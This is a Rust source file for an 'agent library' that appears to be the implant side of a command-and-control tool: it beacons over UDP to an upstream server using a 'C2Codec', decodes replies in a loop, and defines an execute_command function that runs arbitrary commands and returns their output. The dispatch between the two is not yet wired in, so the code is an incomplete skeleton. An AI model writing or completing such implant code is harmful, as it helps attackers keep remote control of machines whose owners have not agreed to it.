//! lib.rs --- agent library
#![feature(never_type)]
pub mod cfg;
pub mod error;
pub mod init;
pub mod install;
#[cfg(feature="exe")]
pub mod exe;
pub use error::Error;

use proto::codec::C2Codec;

use cfg::Config;
use bytes::BytesMut;
use std::net::SocketAddr;
use std::io;
use tokio::net::UdpSocket;
use tokio_util::{codec::{Encoder, Decoder}, udp::UdpFramed};
use std::process::Command;
/// pr2 agent runtime service.
pub struct Service {
  pub up: SocketAddr,
  pub me: SocketAddr,
  pub dn: Option<SocketAddr>,
  pub cfg: Config,
}

impl Service {
  pub fn new(up: SocketAddr, dn: Option<SocketAddr>, cfg: Config) -> Result<Service, Error> {
    Ok(Service {
      up,
      me: SocketAddr::new("::".parse()?, 0),
      dn,
      cfg,
    })
  }

  pub async fn start(&mut self) -> Result<!, Error> {
    // bind socket
    let socket = UdpSocket::bind(self.me).await?;

    // wrap with codec
    let mut inf = UdpFramed::new(socket, C2Codec {});

    // prealloc buffers
    let mut tx_buf = BytesMut::with_capacity(proto::codec::c2::MAX_FRAME_SIZE);
    let mut rx_buf = BytesMut::with_capacity(proto::codec::c2::MAX_FRAME_SIZE);

    loop {
      inf.get_ref().writable().await?;
      match inf.get_mut().try_send_to(&mut tx_buf, self.up) {
	Ok(_) => {
	  // send success, listen for response
	  inf.get_ref().readable().await?;
	  match inf.get_mut().try_recv_buf_from(&mut rx_buf) {
	    Ok((n, remote)) => {
	      // skip if remote != server addr
	      if !remote.eq(&self.up) {
		continue;
	      }
	      rx_buf.truncate(n);
	      match inf.codec_mut().decode(&mut rx_buf) {
		Ok(Some(m)) => {
		  let val = m.val;
		},
		Ok(None) => continue,
		Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {
		  continue;
		}
		Err(e) => {
		  return Err(e.into())
		},
	      }
	    },
	    Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {
	      continue;
	    },
	    Err(e) => return Err(e.into())
	  }
	},
	Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {
	  continue;
	},
	Err(e) => return Err(e.into())
      }
    }
  }
}

pub fn execute_command(command: String, args: Vec<String>) -> String {
    let mut ret = String::new();

    let output = match Command::new(command).args(&args).output() {
        Ok(output) => output,
        Err(err) => {
            return ret;
        }
    };

    ret = match String::from_utf8(output.stdout) {
        Ok(stdout) => stdout,
        Err(err) => {
            return ret;
        }
    };

    return ret;
}
